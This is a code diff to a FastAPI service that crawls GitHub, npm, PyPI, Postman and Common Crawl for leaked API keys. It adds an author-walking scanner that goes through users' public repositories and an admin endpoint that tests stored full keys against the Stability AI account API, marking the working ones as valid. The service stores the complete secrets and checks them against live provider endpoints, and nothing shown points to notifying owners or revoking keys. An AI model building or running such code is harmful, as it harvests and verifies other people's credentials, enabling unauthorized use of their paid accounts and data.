@@ -38,6 +38,7 @@ from postman_scanner import postman_loop
 from npm_scanner import npm_loop
 from pypi_scanner import pypi_loop
 from commoncrawl_scanner import cc_loop
+from author_scanner import author_walk_loop, walk_one_author, run_author_cycle
 from tg_bot import bot_loop
 
 logging.basicConfig(
@@ -152,6 +153,7 @@ async def lifespan(app: FastAPI):
         asyncio.create_task(npm_loop(),             name="npm_scanner"),
         asyncio.create_task(pypi_loop(),            name="pypi_scanner"),
         asyncio.create_task(cc_loop(),              name="commoncrawl_scanner"),
+        asyncio.create_task(author_walk_loop(),     name="author_walk"),
         asyncio.create_task(bot_loop(),             name="tg_bot"),
     ]
     yield
@@ -701,45 +703,86 @@ async def admin_walk_author(
     repos walked vs skipped (already-walked).
     """
     _check_admin(authorization)
-    if platform != "github":
-        return {"ok": False, "error": "only github supported"}
-
-    import sqlite3
     import httpx
-    import scanner
-    from config import GITHUB_TOKENS
-    headers = {"Authorization": f"Bearer {GITHUB_TOKENS[0]}",
-               "Accept": "application/vnd.github+json"}
-    walked = 0
-    skipped = 0
     async with httpx.AsyncClient(timeout=30, follow_redirects=True) as c:
-        # Fetch user's public repos
-        r = await scanner._gh_get(
-            c, f"https://api.github.com/users/{login}/repos",
-            params={"per_page": max_repos, "type": "public", "sort": "pushed"},
-            headers=headers,
-        )
-        if not r:
-            return {"ok": False, "error": f"could not list repos for {login}"}
-        for repo in r:
-            full_name = repo.get("full_name", "")
-            if not full_name:
-                continue
-            stars = repo.get("stargazers_count", 0)
-            created = repo.get("created_at", "")
-            # Skip if already walked in a previous cycle.
-            if not db.try_claim_repo_tree(full_name):
-                skipped += 1
-                continue
-            # try_claim_repo_tree inserted a placeholder; remove it so the
-            # walker's own claim attempt succeeds.
-            with sqlite3.connect(DB_PATH) as conn:
-                conn.execute(
-                    "DELETE FROM tree_walked_repos WHERE repo_full_name=?",
-                    (full_name,),
-                )
-            await scanner.walk_repo_tree(c, full_name, stars, created, headers)
-            walked += 1
+        result = await walk_one_author(c, login, platform, max_repos=max_repos)
+    return {"ok": "error" not in result, "login": login, **result}
 
-    db.mark_author_walked(login, platform)
-    return {"ok": True, "walked": walked, "skipped": skipped, "login": login}
+
+@app.post("/admin/run_author_cycle")
+async def admin_run_author_cycle(
+    authorization: str | None = Header(default=None),
+):
+    """Manually trigger one author-walk batch cycle (instead of waiting 24h).
+
+    Picks AUTHOR_WALK_BATCH watched authors with stale last_walked_at
+    and walks each. Useful right after deploy or after explicit reset.
+    """
+    _check_admin(authorization)
+    return {"ok": True, **(await run_author_cycle())}
+
+
+@app.post("/admin/backfill_stability")
+async def admin_backfill_stability(
+    only_dead: bool = True,
+    limit: int = 500,
+    authorization: str | None = Header(default=None),
+):
+    """One-time backfill: reclassify openai-classified 48-char keys to
+    Stability when they validate against Stability API.
+
+    Background: pre-2026-05, our extract_openai matched `sk-[A-Za-z0-9]{48}`
+    without disambiguating from Stability AI keys (same shape). Many old
+    rows tagged provider=openai is_valid=0 are actually live Stability
+    keys that were never validated against the Stability endpoint.
+
+    For each candidate row:
+      1. Probe https://api.stability.ai/v1/user/account with the key
+      2. If 200 → reclassify provider=stability, is_valid=1, stamp
+         last_validated_at
+      3. If non-200 → leave row alone
+    """
+    _check_admin(authorization)
+    import sqlite3
+    import re as _re
+    from validators import validate_stability
+    pat48 = _re.compile(r'^sk-[A-Za-z0-9]{48}$')
+    where_dead = "AND is_valid=0" if only_dead else ""
+    with sqlite3.connect(DB_PATH) as conn:
+        conn.row_factory = sqlite3.Row
+        rows = conn.execute(
+            f"""SELECT id, key_hash, key_full FROM found_keys
+                WHERE provider='openai' {where_dead}
+                LIMIT ?""",
+            (limit,),
+        ).fetchall()
+    candidates = [r for r in rows if pat48.match(r["key_full"])]
+    reclassified = 0
+    skipped = 0
+    for row in candidates:
+        try:
+            if await validate_stability(row["key_full"]):
+                with sqlite3.connect(DB_PATH) as conn:
+                    conn.execute(
+                        """UPDATE found_keys
+                           SET provider='stability',
+                               is_valid=1,
+                               last_validated_at=?
+                           WHERE id=?""",
+                        (datetime.now(timezone.utc).isoformat(), row["id"]),
+                    )
+                reclassified += 1
+                log.info("[backfill_stability] reclassified id=%s as stability VALID",
+                         row["id"])
+            else:
+                skipped += 1
+        except Exception as e:
+            log.debug("backfill_stability err id=%s: %s", row["id"], e)
+            skipped += 1
+    return {
+        "ok": True,
+        "checked": len(candidates),
+        "reclassified": reclassified,
+        "skipped_or_failed": skipped,
+        "message": f"Reclassified {reclassified} keys from openai → stability",
+    }
